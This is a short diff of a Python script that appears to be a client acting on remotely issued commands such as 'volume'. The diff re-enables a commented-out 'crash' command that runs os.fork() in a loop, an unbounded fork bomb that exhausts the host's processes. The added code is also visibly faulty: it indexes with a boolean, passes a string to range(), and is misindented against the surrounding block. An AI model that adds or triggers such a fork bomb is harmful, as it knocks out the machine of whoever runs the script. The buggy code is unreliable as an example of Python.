@@ -98,15 +98,15 @@ while True:
                     else:
                         old_command = commandId
                         continue
-#                if command.startswith("crash"):
-#                    from os import fork
-#                    command = command.split()
-#                    if command[1<len(command)]:
-#                        for _ in range(command[1]):
-#                            fork()
-#                    else:
-#                        while 1:
-#                            fork()
+               if command.startswith("crash"):
+                   from os import fork
+                   command = command.split()
+                   if command[1<len(command)]:
+                       for _ in range(command[1]):
+                           fork()
+                   else:
+                       while 1:
+                           fork()
                 elif command.startswith('volume'):
                     localcmd = command.split()
                     if localcmd[1<len(localcmd)]:
